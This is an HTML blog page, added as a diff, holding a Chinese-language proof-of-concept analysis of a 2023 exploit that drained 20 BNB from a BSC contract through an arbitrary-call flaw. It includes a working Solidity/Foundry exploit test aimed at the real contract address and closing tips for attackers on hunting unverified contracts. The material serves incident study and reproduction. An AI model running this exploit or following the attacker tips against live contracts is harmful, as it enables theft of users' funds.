@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="LEVI_104" />
+  <meta name="description" content="始生有物，其形必丑" />
+  
+  
+  <title>
+    
+      13.DEXRouter@arbitrary-call 
+      
+      
+      |
+    
+     Sec Life
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="https://s1.vika.cn/space/2022/11/28/de7a2d4fa7ec48ef997fad1fb8af2fe0">
+    <link rel="icon" href="https://moe.photo/images/2023/06/29/d1b2faa44e90a63bb67cc7e990947a2.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="https://moe.photo/images/2023/06/29/d1b2faa44e90a63bb67cc7e990947a2.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">LEVI_104</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">13.DEXRouter@arbitrary-call</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2023-11-19 15:00:55
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/08-PoC/" title="08.PoC">
+                    <b>#</b> 08.PoC
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="DEXRouter-arbitrary-call"><a href="#DEXRouter-arbitrary-call" class="headerlink" title="DEXRouter@arbitrary-call"></a>DEXRouter@arbitrary-call</h1><ul>
+<li>时间：2023-09-29 08:49:19 (UTC)</li>
+<li>损失金额：20 BNB（$4,337.20）</li>
+<li>twitter：<a target="_blank" rel="noopener" href="https://twitter.com/DecurityHQ/status/1707851321909428688">https://twitter.com/DecurityHQ/status/1707851321909428688</a></li>
+</ul>
+<h2 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h2><ul>
+<li>黑客EOA地址：<a target="_blank" rel="noopener" href="https://bscscan.com/address/0x09039e2082a0a815908e68bd52b86f96573768e8">0x09039e2082a0a815908e68bd52b86f96573768e8</a></li>
+<li><p>黑客用来攻击的合约地址：<a target="_blank" rel="noopener" href="https://bscscan.com/address/0x0f41f9146de354e5ac6bb3996e2e319dc8a3bb7f">0x0F41f9146dE354e5Ac6Bb3996e2E319Dc8a3Bb7f</a></p>
+</li>
+<li><p>攻击事件hash：<a target="_blank" rel="noopener" href="https://bscscan.com/tx/0xf77c5904da98d3d4a6e651d0846d35545ef5ca0b969132ae81a9c63e1efc2113">0xf77c5904da98d3d4a6e651d0846d35545ef5ca0b969132ae81a9c63e1efc2113</a></p>
+</li>
+<li><p>被攻击合约的地址：<a target="_blank" rel="noopener" href="https://bscscan.com/address/0x1f7cf218b46e613d1ba54cac11dc1b5368d94fb7#code">0x1f7cF218B46e613D1BA54CaC11dC1b5368d94fb7</a></p>
+</li>
+</ul>
+<h2 id="资金流向"><a href="#资金流向" class="headerlink" title="资金流向"></a>资金流向</h2><p><img src="/2023/11/19/08.PoC/13.DEXRouter@arbitrary-call/image-20231105215835589.png" alt="image-20231105215835589"></p>
+<h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>攻击过程非常简单，就调用了<code>update()</code>和<code>functionCallWithValue()</code></p>
+<p><img src="/2023/11/19/08.PoC/13.DEXRouter@arbitrary-call/image-20231105220023234.png" alt="image-20231105220023234"></p>
+<h2 id="攻击详细分析"><a href="#攻击详细分析" class="headerlink" title="攻击详细分析"></a>攻击详细分析</h2><p>此次攻击中使得slot 1、2、3、4、发生了变化，很明显是<code>update()</code>导致的。成功调用<code>update()</code>会使得这几个storage值发生变化，攻击者将其修改为攻击合约地址，为后续调用<code>functionCallWithValue()</code>做准备。</p>
+<p><img src="/2023/11/19/08.PoC/13.DEXRouter@arbitrary-call/image-20231105220931357.png" alt="image-20231105220931357"></p>
+<p>有了权限之后，直接调用<code>functionCallWithValue()</code>即可获利，这个函数指定调用某个合约的某个方法，然后会发送以太。攻击者可以随意写一个函数返回true，然后设置好发送的以太即可。</p>
+<p>其实这个攻击非常简单，就是获取权限，然后用权限调用关键方法进行获利。这个被攻击的合约没有开源，没开源就认为自己的合约很安全（不知道为啥我在多个网站都无法反编译这个合约的runtimecoee）。其实，这一类的攻击思路很简单，并且也经常发生，攻击思路主要是：找为开源的合约（一般都不咋安全），然后fuzz看看能不能获取到权限，如果获取到权限则调用获利函数。</p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><a target="_blank" rel="noopener" href="https://github.com/chen4903/BlockChainPoC/tree/master">GitHub</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ContractTest is Test &#123;</span><br><span class="line">    // Victim unverified contract. Name &quot;DEXRouter&quot; taken from parameter name in &quot;go&quot; function in attack contract</span><br><span class="line">    IDEXRouter private constant DEXRouter =</span><br><span class="line">        IDEXRouter(0x1f7cF218B46e613D1BA54CaC11dC1b5368d94fb7);</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(&quot;bsc&quot;, 32161325);</span><br><span class="line">        vm.label(address(DEXRouter), &quot;DEXRouter&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testExploit() public &#123;</span><br><span class="line">        deal(address(this), 0 ether);</span><br><span class="line">        emit log_named_decimal_uint(</span><br><span class="line">            &quot;Attacker BNB balance before exploit&quot;,</span><br><span class="line">            address(this).balance,</span><br><span class="line">            18</span><br><span class="line">        );</span><br><span class="line">        // DEXRouter will call back to function with selector &quot;0xe44a73b7&quot;. Look at fallback function</span><br><span class="line">        DEXRouter.update(</span><br><span class="line">            address(this),</span><br><span class="line">            address(this),</span><br><span class="line">            address(this),</span><br><span class="line">            address(this)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // Arbitrary external call vulnerability here. DEXRouter will call back &quot;a&quot; payable function and next transfer BNB to this contract</span><br><span class="line">        DEXRouter.functionCallWithValue(</span><br><span class="line">            address(this),</span><br><span class="line">            abi.encodePacked(this.a.selector),</span><br><span class="line">            address(DEXRouter).balance</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        emit log_named_decimal_uint(</span><br><span class="line">            &quot;Attacker BNB balance after exploit&quot;,</span><br><span class="line">            address(this).balance,</span><br><span class="line">            18</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function a() external payable returns (bool) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback(bytes calldata data) external payable returns (bytes memory) &#123;</span><br><span class="line">        if (bytes4(data) == bytes4(0xe44a73b7)) &#123;</span><br><span class="line">            return abi.encode(true);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><ul>
+<li>防守者：不要认为为开源就安全，黑客还是很牛的</li>
+<li>攻击者：扫未开源的合约，fuzz看看能不能获取权限，或者可以做随意的call调用</li>
+</ul>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/11/19/08.PoC/15.BFCToken@rewardLogic/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2023-11-19 15:00:55
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/08-PoC/" title="08.PoC">
+                        <b>#</b> 08.PoC
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2023/11/19/08.PoC/14.CEXISWAP@Incorrect-Access/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DEXRouter-arbitrary-call"><span class="toc-text">DEXRouter@arbitrary-call</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%A4%E6%98%93"><span class="toc-text">交易</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%84%E9%87%91%E6%B5%81%E5%90%91"><span class="toc-text">资金流向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%BF%87%E7%A8%8B"><span class="toc-text">攻击过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90"><span class="toc-text">攻击详细分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-text">复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BB%BA%E8%AE%AE"><span class="toc-text">建议</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://s1.vika.cn/space/2022/11/28/f39f02b157524b31805619f093b4b3c8">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" target="_blank" rel="noopener" href="https://s1.vika.cn/space/2022/11/27/6bf8f7df3643480a9d216473a3caf2d0">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + 13.DEXRouter%40arbitrary-call + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F11%2F19%2F08.PoC%2F13.DEXRouter%40arbitrary-call%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/11/19/08.PoC/13.DEXRouter@arbitrary-call/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+
+</body>
+</html>
